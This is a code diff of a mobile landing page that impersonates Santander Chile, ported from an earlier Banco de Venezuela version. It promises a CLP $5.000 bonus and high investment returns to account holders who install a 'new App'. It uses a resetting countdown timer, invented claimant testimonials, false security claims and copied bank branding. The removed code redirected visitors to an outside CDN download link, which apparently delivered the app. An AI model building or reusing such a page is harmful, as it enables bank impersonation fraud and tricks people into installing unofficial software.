-            <div class="flex items-center space-x-1.5">
-                <i class="fa-solid fa-headset text-cyan-400"></i>
-                <span>Soporte 24/7</span>
-            </div>
+                <div class="divide-y divide-slate-100">
+                    <!-- FAQ 1 -->
+                    <div class="py-3 first:pt-0">
+                        <button type="button" class="faq-toggle w-full flex items-center justify-between text-left gap-3 cursor-pointer" aria-expanded="true">
+                            <span class="text-[13px] font-bold text-slate-800">¿Por qué necesito más de CLP $100.000 en Santander Bank?</span>
+                            <svg class="faq-icon w-4 h-4 text-[#EC0000] shrink-0 transition-transform duration-200 rotate-180" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5">
+                                <path stroke-linecap="round" stroke-linejoin="round" d="M19 9l-7 7-7-7"/>
+                            </svg>
+                        </button>
+                        <div class="faq-content mt-2 text-xs text-slate-500 leading-relaxed">
+                            Este programa de inversión preferencial está diseñado para clientes de Santander Chile con liquidez superior a <strong>CLP $100.000</strong>, permitiendo acceder a instrumentos de alta rentabilidad diaria sin comisiones de entrada.
+                        </div>
+                    </div>
+
+                    <!-- FAQ 2 -->
+                    <div class="py-3">
+                        <button type="button" class="faq-toggle w-full flex items-center justify-between text-left gap-3 cursor-pointer" aria-expanded="false">
+                            <span class="text-[13px] font-bold text-slate-800">¿Cuándo recibo el bono de CLP $5.000?</span>
+                            <svg class="faq-icon w-4 h-4 text-slate-400 shrink-0 transition-transform duration-200" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5">
+                                <path stroke-linecap="round" stroke-linejoin="round" d="M19 9l-7 7-7-7"/>
+                            </svg>
+                        </button>
+                        <div class="faq-content hidden mt-2 text-xs text-slate-500 leading-relaxed">
+                            El abono de <strong>CLP $5.000</strong> es automático e instantáneo una vez que descargas e instalas la nueva App y validas tu cuenta elegible con el código promocional generado en esta página.
+                        </div>
+                    </div>
+
+                    <!-- FAQ 3 -->
+                    <div class="py-3 last:pb-0">
+                        <button type="button" class="faq-toggle w-full flex items-center justify-between text-left gap-3 cursor-pointer" aria-expanded="false">
+                            <span class="text-[13px] font-bold text-slate-800">¿Es seguro vincular mi inversión desde Chile?</span>
+                            <svg class="faq-icon w-4 h-4 text-slate-400 shrink-0 transition-transform duration-200" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5">
+                                <path stroke-linecap="round" stroke-linejoin="round" d="M19 9l-7 7-7-7"/>
+                            </svg>
+                        </button>
+                        <div class="faq-content hidden mt-2 text-xs text-slate-500 leading-relaxed">
+                            Sí. Todas las operaciones cuentan con cifrado bancario de nivel institucional y autenticación biométrica compatible con estándares financieros en Chile.
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- 底部安全认证脚注 -->
+            <footer class="text-center px-3 pt-1 pb-2 space-y-1.5">
+                <div class="flex items-center justify-center gap-3 text-[11px] font-semibold text-slate-500">
+                    <span class="flex items-center gap-1">🔒 Cifrado SSL 256-bit</span>
+                    <span>•</span>
+                    <span>🇨🇱 Exclusivo Chile</span>
+                </div>
+                <p class="text-[10.5px] text-slate-400 leading-normal">
+                    Promoción válida para clientes con saldo superior a CLP $100.000 en Santander Bank. El bono de CLP $5.000 se otorga al descargar e instalar la aplicación móvil oficial.
+                </p>
+            </footer>
         </div>
 
+        <!-- 7. 底部悬浮高转化行动号召栏 (Sticky Bottom CTA) -->
+        <div class="fixed sm:sticky bottom-0 left-0 right-0 z-30 max-w-[430px] mx-auto bg-white/95 backdrop-blur-md border-t border-slate-200/90 px-4 pt-3 pb-4 shadow-[0_-10px_25px_-5px_rgba(0,0,0,0.08)]">
+            <button id="downloadCtaBtn" type="button" class="cta-pulse w-full py-3.5 px-5 rounded-2xl bg-gradient-to-r from-[#EC0000] to-[#C80000] hover:from-[#D50000] hover:to-[#A80000] active:scale-[0.98] text-white font-extrabold transition-all duration-200 flex items-center justify-between cursor-pointer">
+                <div class="text-left">
+                    <span class="block text-[10.5px] uppercase tracking-wider text-red-100 font-bold">Saldo &gt; CLP $100.000 Verificado</span>
+                    <span class="block text-[17px] leading-tight">Descargar App y Ganar CLP $5.000</span>
+                </div>
+                <div class="w-10 h-10 rounded-xl bg-white/20 flex items-center justify-center shrink-0">
+                    <svg class="w-5 h-5 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"/>
+                    </svg>
+                </div>
+            </button>
+        </div>
+
+        <!-- 8. 奖金激活与 App 下载弹窗 Modal -->
+        <div id="rewardModal" class="hidden fixed inset-0 z-50 bg-slate-900/65 backdrop-blur-xs flex items-end sm:items-center justify-center p-4 transition-opacity duration-200">
+            <div class="bg-white w-full max-w-[395px] rounded-3xl p-6 shadow-2xl transform transition-all relative border border-slate-100 max-h-[92vh] overflow-y-auto no-scrollbar">
+                
+                <!-- 关闭按钮 -->
+                <button id="closeModalBtn" type="button" class="absolute top-4 right-4 w-8 h-8 rounded-full bg-slate-100 hover:bg-slate-200 text-slate-500 flex items-center justify-center transition-colors cursor-pointer" aria-label="Cerrar">
+                    <svg class="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12"/>
+                    </svg>
+                </button>
+
+                <!-- 顶部小型 Santander CL 徽标 + 绿色对勾 -->
+                <div class="flex items-center justify-center gap-2 mb-3">
+                    <div class="w-12 h-12 rounded-2xl bg-[#EC0000] shadow-md flex items-center justify-center">
+                        <svg viewBox="0 0 180 180" class="w-full h-full" xmlns="http://www.w3.org/2000/svg">
+                            <rect width="180" height="180" rx="40" fill="#EC0000"/>
+                            <text x="122" y="53" fill="#FFFFFF" font-family="Inter, Arial, sans-serif" font-weight="700" font-size="27">CL</text>
+                            <g transform="translate(0, 4)">
+                                <ellipse cx="90" cy="113" rx="64" ry="27" fill="#FFFFFF"/>
+                                <path d="M 76 123 C 54 98, 56 68, 72 48 C 72 68, 86 83, 86 105 C 86 113, 81 119, 76 123 Z" fill="#FFFFFF" stroke="#EC0000" stroke-width="5.5" stroke-linejoin="round"/>
+                                <path d="M 91 129 C 69 96, 74 52, 91 22 C 91 50, 113 68, 113 96 C 113 111, 102 121, 91 129 Z" fill="#FFFFFF" stroke="#EC0000" stroke-width="5.5" stroke-linejoin="round"/>
+                                <path d="M 105 123 C 122 103, 122 77, 107 58 C 107 75, 95 88, 95 107 C 95 114, 100 119, 105 123 Z" fill="#FFFFFF" stroke="#EC0000" stroke-width="5.5" stroke-linejoin="round"/>
+                            </g>
+                        </svg>
+                    </div>
+                    <div class="w-9 h-9 rounded-full bg-emerald-100 text-emerald-600 flex items-center justify-center -ml-4 mt-5 border-2 border-white shadow-xs">
+                        <svg class="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="3">
+                            <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/>
+                        </svg>
+                    </div>
+                </div>
+
+                <!-- 智能设备识别标签 -->
+                <div class="text-center mb-1.5">
+                    <span id="detectedDeviceBadge" class="inline-block px-2.5 py-0.5 rounded-full bg-slate-100 text-slate-600 text-[10.5px] font-bold">
+                        Dispositivo detectado: Smartphone Chile
+                    </span>
+                </div>
+
+                <h2 class="text-xl font-black text-slate-900 text-center mb-1">
+                    ¡Bono CLP $5.000 Activado!
+                </h2>
+                <p class="text-xs text-slate-500 text-center mb-4 leading-relaxed">
+                    Elegibilidad confirmada (&gt; CLP $100.000 en Santander Bank). Copia tu código personal e instala la nueva App para recibir tu abono al instante:
+                </p>
+
+                <!-- 专属动态兑换码卡片 -->
+                <div class="bg-gradient-to-r from-red-50 to-amber-50/60 border-2 border-dashed border-[#EC0000]/60 rounded-2xl p-3.5 mb-4 flex items-center justify-between">
+                    <div>
+                        <span class="block text-[10px] uppercase tracking-wider font-extrabold text-[#EC0000]">Código Único de Bono</span>
+                        <span id="promoCodeText" class="text-lg font-black tracking-widest text-slate-900">CL-SAN5000</span>
+                    </div>
+                    <button id="copyCodeBtn" type="button" class="px-3.5 py-2 rounded-xl bg-[#EC0000] hover:bg-[#B80000] text-white text-xs font-bold shadow-sm transition-colors flex items-center gap-1.5 cursor-pointer">
+                        <svg class="w-3.5 h-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.2">
+                            <path stroke-linecap="round" stroke-linejoin="round" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/>
+                        </svg>
+                        <span id="copyBtnLabel">Copiar</span>
+                    </button>
+                </div>
+
+                <!-- 商店下载按钮组 -->
+                <div class="space-y-2.5 mb-4">
+                    <a id="iosStoreBtn" href="#download-ios" onclick="handleStoreClick(event, 'App Store (iOS)')" class="w-full py-3 px-4 rounded-xl bg-slate-900 hover:bg-black text-white flex items-center justify-between transition-colors shadow-sm">
+                        <div class="flex items-center gap-3">
+                            <svg class="w-6 h-6 fill-current" viewBox="0 0 24 24">
+                                <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M15.96 6.33c.64-.78 1.08-1.86.96-2.94-.93.04-2.06.62-2.72 1.4-.58.68-1.1 1.79-.96 2.84 1.04.08 2.08-.52 2.72-1.3z"/>
+                            </svg>
+                            <div class="text-left">
+                                <div class="text-[10px] text-slate-300 leading-none">Descargar en el</div>
+                                <div class="text-sm font-bold leading-tight">App Store</div>
+                            </div>
+                        </div>
+                        <span id="iosRecommendedTag" class="hidden text-[10px] font-bold bg-emerald-500 text-white px-2 py-0.5 rounded-md">Recomendado</span>
+                    </a>
+
+                    <a id="androidStoreBtn" href="#download-android" onclick="handleStoreClick(event, 'Google Play')" class="w-full py-3 px-4 rounded-xl bg-[#D50000] hover:bg-[#B80000] text-white flex items-center justify-between transition-colors shadow-sm">
+                        <div class="flex items-center gap-3">
+                            <svg class="w-5 h-5 fill-current" viewBox="0 0 24 24">
+                                <path d="M3,20.5V3.5C3,2.91 3.34,2.39 3.84,2.15L13.69,12L3.84,21.85C3.34,21.6 3,21.09 3,20.5M16.81,15.12L6.05,21.34L14.54,12.85L16.81,15.12M20.16,10.81C20.5,11.08 20.75,11.5 20.75,12C20.75,12.5 20.53,12.9 20.18,13.18L17.89,14.5L15.39,12L17.89,9.5L20.16,10.81M6.05,2.66L16.81,8.88L14.54,11.15L6.05,2.66Z"/>
+                            </svg>
+                            <div class="text-left">
+                                <div class="text-[10px] text-red-100 leading-none">Disponible en</div>
+                                <div class="text-sm font-bold leading-tight">Google Play</div>
+                            </div>
+                        </div>
+                        <span id="androidRecommendedTag" class="hidden text-[10px] font-bold bg-amber-300 text-slate-900 px-2 py-0.5 rounded-md">Recomendado</span>
+                    </a>
+                </div>
+
+                <!-- 激活步骤微提示 -->
+                <div class="bg-slate-50 rounded-xl p-3 border border-slate-200/70 text-[11px] text-slate-600 space-y-1">
+                    <p class="font-bold text-slate-800">Pasos rápidos tras instalar:</p>
+                    <p>1. Abre la App e ingresa con tu perfil Santander Chile.</p>
+                    <p>2. Pega el código <strong id="inlineCodeRef" class="text-[#EC0000]">CL-SAN5000</strong> en "Mis Bonos".</p>
+                    <p>3. Recibe tus <strong>CLP $5.000</strong> disponibles al instante.</p>
+                </div>
+
+                <!-- 商店跳转反馈 -->
+                <p id="storeStatusMsg" class="hidden mt-3 text-center text-xs font-bold text-emerald-700 bg-emerald-50 py-2.5 px-3 rounded-xl border border-emerald-200"></p>
+            </div>
+        </div>
     </main>
 
-    <!-- Footer -->
-    <footer class="bg-slate-950 border-t border-slate-800 py-4 px-4 text-center text-xs text-slate-500 space-y-1">
-        <p>© 2026 Banco de Venezuela - Todos los derechos reservados.</p>
-        <p class="text-[10px] text-slate-600">Promoción sujeta a términos y condiciones de inversión digital.</p>
-    </footer>
+    <script>
+        // 智利比索千分位格式化工具 (例如: 500000 -> "CLP $500.000")
+        function formatCLP(amount) {
+            return 'CLP $' + Math.round(amount).toString().replace(/\B(?=(\d{3})+(?!\d))/g, '.');
+        }
 
-    <!-- Custom Modal for Alerts/Messages (No alert() used) -->
-    <div id="customModal" class="fixed inset-0 bg-black/70 backdrop-blur-sm z-50 hidden flex items-center justify-center p-4">
-        <div class="bg-slate-800 border border-slate-700 rounded-3xl p-6 max-w-sm w-full text-center space-y-4 shadow-2xl">
-            <div class="w-16 h-16 bg-emerald-500/20 text-emerald-400 rounded-full flex items-center justify-center mx-auto text-3xl">
-                <i class="fa-solid fa-circle-check"></i>
-            </div>
-            <h4 id="modalTitle" class="text-lg font-bold text-white">Redirigiendo a Descarga</h4>
-            <p id="modalText" class="text-xs text-slate-300 leading-relaxed">
-                Preparando el instalador oficial de inversión BDV. Asegúrate de tener tu cuenta lista con más de 50.000 Bs para reclamar tus 5.000 Bs de bono.
-            </p>
-            <button onclick="closeModal()" class="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-3 rounded-xl text-xs transition">
-                Continuar
-            </button>
-        </div>
-    </div>
+        document.addEventListener('DOMContentLoaded', () => {
+            // 1. 优惠倒计时 (15分钟循环倒计时增强紧迫感)
+            let totalSeconds = 14 * 60 + 59;
+            const countdownEl = document.getElementById('countdownTimer');
+            setInterval(() => {
+                if (totalSeconds <= 0) totalSeconds = 15 * 60;
+                totalSeconds--;
+                const mins = String(Math.floor(totalSeconds / 60)).padStart(2, '0');
+                const secs = String(totalSeconds % 60).padStart(2, '0');
+                countdownEl.textContent = `${mins}:${secs}`;
+            }, 1000);
 
-    <!-- JavaScript Logic -->
-    <!-- JavaScript Logic -->
-<script>
-    // 真实跳转的目标地址，按需修改
-    const REDIRECT_URL = "https://huoshan-dl.b-cdn.net/a_50103682035";
+            // 2. 智利各城市实时领取轮播
+            const claims = [
+                'Camila M. (Santiago) activó su bono de <strong class="text-slate-900">CLP $5.000</strong> hace 1 min',
+                'Matías R. (Viña del Mar) invirtió desde Santander y ganó <strong class="text-slate-900">CLP $5.000</strong>',
+                'Valentina S. (Concepción) instaló la App y recibió <strong class="text-slate-900">CLP $5.000</strong>',
+                'Sebastián G. (Antofagasta) desbloqueó su bono de <strong class="text-slate-900">CLP $5.000</strong>',
+                'Francisca L. (Temuco) recibió <strong class="text-slate-900">CLP $5.000</strong> al instante'
+            ];
+            let claimIdx = 0;
+            const tickerEl = document.getElementById('liveClaimTicker');
+            setInterval(() => {
+                tickerEl.style.opacity = '0';
+                setTimeout(() => {
+                    claimIdx = (claimIdx + 1) % claims.length;
+                    tickerEl.innerHTML = claims[claimIdx];
+                    tickerEl.style.opacity = '1';
+                }, 280);
+            }, 4200);
 
-    function handleDownload() {
-        const modal = document.getElementById('customModal');
-        modal.classList.remove('hidden');
-    }
+            // 3. 智利比索 (CLP) 投资收益与奖金模拟器逻辑
+            const slider = document.getElementById('clpRangeSlider');
+            const selectedCapitalDisplay = document.getElementById('selectedCapitalDisplay');
+            const annualReturnDisplay = document.getElementById('annualReturnDisplay');
+            const monthlyReturnDisplay = document.getElementById('monthlyReturnDisplay');
+            const totalProjectedDisplay = document.getElementById('totalProjectedDisplay');
+            const chartLinePath = document.getElementById('chartLinePath');
+            const chartAreaPath = document.getElementById('chartAreaPath');
+            const chartEndGroup = document.getElementById('chartEndGroup');
+            const presetBtns = document.querySelectorAll('.preset-btn');
 
-    function closeModal() {
-        const modal = document.getElementById('customModal');
-        modal.classList.add('hidden');
-        // 真实跳转：当前页面导航到 REDIRECT_URL
-        window.location.href = REDIRECT_URL;
-    }
-</script>
+            function updateSimulator(val) {
+                const capital = Number(val);
+                const min = Number(slider.min);
+                const max = Number(slider.max);
+                const progressPercent = ((capital - min) / (max - min)) * 100;
+                slider.style.setProperty('--progress', `${progressPercent}%`);
+
+                // 年化预估 11.4% + 即时奖励 CLP $5.000
+                const annualRate = 0.114;
+                const instantBonus = 5000;
+                const annualProfit = Math.round(capital * annualRate);
+                const monthlyProfit = Math.round(annualProfit / 12);
+                const totalGainWithBonus = annualProfit + instantBonus;
+                const finalProjected = capital + totalGainWithBonus;
+
+                selectedCapitalDisplay.textContent = formatCLP(capital);
+                annualReturnDisplay.textContent = '+ ' + formatCLP(totalGainWithBonus);
+                monthlyReturnDisplay.textContent = `~${formatCLP(monthlyProfit)} / mes + bono`;
+                totalProjectedDisplay.textContent = `Total est.: ${formatCLP(finalProjected)}`;
+
+                // 动态更新 SVG 曲线斜率与终点坐标 (Y轴范围: 52 ~ 16)
+                const endY = Math.round(52 - (progressPercent / 100) * 36);
+                const startY = 98;
+                const y1 = Math.round(startY - (startY - endY) * 0.22);
+                const y2 = Math.round(startY - (startY - endY) * 0.46);
+                const y3 = Math.round(startY - (startY - endY) * 0.72);
+
+                const lineD = `M 15 ${startY} L 85 ${y1} L 155 ${y2} L 225 ${y3} L 295 ${endY}`;
+                const areaD = `${lineD} L 295 105 L 15 105 Z`;
+
+                chartLinePath.setAttribute('d', lineD);
+                chartAreaPath.setAttribute('d', areaD);
+                chartEndGroup.setAttribute('transform', `translate(295, ${endY})`);
+
+                // 高亮对应的快捷按钮
+                presetBtns.forEach(btn => {
+                    const btnAmt = Number(btn.dataset.amount);
+                    if (btnAmt === capital) {
+                        btn.classList.remove('bg-white', 'border-slate-200', 'text-slate-700');
+                        btn.classList.add('bg-red-50', 'border-[#EC0000]', 'text-[#EC0000]');
+                    } else {
+                        btn.classList.add('bg-white', 'border-slate-200', 'text-slate-700');
+                        btn.classList.remove('bg-red-50', 'border-[#EC0000]', 'text-[#EC0000]');
+                    }
+                });
+            }
+
+            slider.addEventListener('input', (e) => updateSimulator(e.target.value));
+            presetBtns.forEach(btn => {
+                btn.addEventListener('click', () => {
+                    slider.value = btn.dataset.amount;
+                    updateSimulator(btn.dataset.amount);
+                });
+            });
+            updateSimulator(slider.value);
+
+            // 4. 资格确认复选框交互
+            const balanceConfirm = document.getElementById('balanceConfirm');
+            const eligibilityBox = document.getElementById('eligibilityBox');
+            const eligibilityStatusBadge = document.getElementById('eligibilityStatusBadge');
+            const validationNotice = document.getElementById('validationNotice');
+            const downloadCtaBtn = document.getElementById('downloadCtaBtn');
+            const rewardModal = document.getElementById('rewardModal');
+            const closeModalBtn = document.getElementById('closeModalBtn');
+
+            balanceConfirm.addEventListener('change', () => {
+                if (balanceConfirm.checked) {
+                    validationNotice.classList.add('hidden');
+                    eligibilityBox.classList.remove('border-amber-400', 'bg-amber-50/50');
+                    eligibilityStatusBadge.textContent = '✓ Calificas para invertir y recibir CLP $5.000';
+                    eligibilityStatusBadge.className = 'inline-flex items-center gap-1 mt-1.5 text-[11px] font-bold text-emerald-700 bg-emerald-50 border border-emerald-200 px-2 py-0.5 rounded-md';
+                } else {
+                    eligibilityStatusBadge.textContent = 'Requiere confirmar saldo > CLP $100.000';
+                    eligibilityStatusBadge.className = 'inline-flex items-center gap-1 mt-1.5 text-[11px] font-bold text-amber-700 bg-amber-50 border border-amber-200 px-2 py-0.5 rounded-md';
+                }
+            });
+
+            // 生成唯一激活码并识别设备类型
+            function prepareModalData() {
+                const randomDigits = Math.floor(1000 + Math.random() * 9000);
+                const generatedCode = `CL-${randomDigits}-5K`;
+                document.getElementById('promoCodeText').textContent = generatedCode;
+                document.getElementById('inlineCodeRef').textContent = generatedCode;
+
+                const ua = navigator.userAgent || '';
+                const deviceBadge = document.getElementById('detectedDeviceBadge');
+                const iosTag = document.getElementById('iosRecommendedTag');
+                const androidTag = document.getElementById('androidRecommendedTag');
+
+                if (/iPad|iPhone|iPod/.test(ua)) {
+                    deviceBadge.textContent = 'Dispositivo detectado: iPhone / iOS';
+                    iosTag.classList.remove('hidden');
+                } else if (/Android/.test(ua)) {
+                    deviceBadge.textContent = 'Dispositivo detectado: Android Chile';
+                    androidTag.classList.remove('hidden');
+                } else {
+                    deviceBadge.textContent = 'Compatible con iOS y Android Chile';
+                }
+            }
+
+            downloadCtaBtn.addEventListener('click', () => {
+                if (!balanceConfirm.checked) {
+                    validationNotice.classList.remove('hidden');
+                    eligibilityBox.classList.add('border-amber-400', 'bg-amber-50/50');
+                    document.getElementById('eligibilitySection').scrollIntoView({ behavior: 'smooth', block: 'center' });
+                    return;
+                }
+                prepareModalData();
+                rewardModal.classList.remove('hidden');
+            });
+
+            closeModalBtn.addEventListener('click', () => rewardModal.classList.add('hidden'));
+            rewardModal.addEventListener('click', (e) => {
+                if (e.target === rewardModal) rewardModal.classList.add('hidden');
+            });
+
+            // 5. 一键复制激活码
+            const copyCodeBtn = document.getElementById('copyCodeBtn');
+            const copyBtnLabel = document.getElementById('copyBtnLabel');
+            copyCodeBtn.addEventListener('click', () => {
+                const code = document.getElementById('promoCodeText').textContent.trim();
+                const tempInput = document.createElement('textarea');
+                tempInput.value = code;
+                tempInput.style.position = 'fixed';
+                tempInput.style.opacity = '0';
+                document.body.appendChild(tempInput);
+                tempInput.select();
+                try {
+                    document.execCommand('copy');
+                    copyBtnLabel.textContent = '¡Copiado!';
+                    copyCodeBtn.classList.remove('bg-[#EC0000]');
+                    copyCodeBtn.classList.add('bg-emerald-600');
+                    setTimeout(() => {
+                        copyBtnLabel.textContent = 'Copiar';
+                        copyCodeBtn.classList.remove('bg-emerald-600');
+                        copyCodeBtn.classList.add('bg-[#EC0000]');
+                    }, 2200);
+                } catch (err) {
+                    copyBtnLabel.textContent = code;
+                } finally {
+                    document.body.removeChild(tempInput);
+                }
+            });
+
+            // 6. FAQ 手风琴交互
+            document.querySelectorAll('.faq-toggle').forEach(toggle => {
+                toggle.addEventListener('click', () => {
+                    const content = toggle.nextElementSibling;
+                    const icon = toggle.querySelector('.faq-icon');
+                    const isOpen = !content.classList.contains('hidden');
+
+                    if (isOpen) {
+                        content.classList.add('hidden');
+                        icon.classList.remove('rotate-180', 'text-[#EC0000]');
+                        icon.classList.add('text-slate-400');
+                        toggle.setAttribute('aria-expanded', 'false');
+                    } else {
+                        content.classList.remove('hidden');
+                        icon.classList.add('rotate-180', 'text-[#EC0000]');
+                        icon.classList.remove('text-slate-400');
+                        toggle.setAttribute('aria-expanded', 'true');
+                    }
+                });
+            });
+        });
+
+        // 商店跳转模拟状态反馈
+        function handleStoreClick(event, storeName) {
+            event.preventDefault();
+            const code = document.getElementById('promoCodeText').textContent.trim();
+            const statusEl = document.getElementById('storeStatusMsg');
+            statusEl.innerHTML = `Conectando con <strong>${storeName}</strong>... Tu código <strong>${code}</strong> (CLP $5.000) ha sido vinculado automáticamente.`;
+            statusEl.classList.remove('hidden');
+        }
+    </script>
+</body>
+</html>
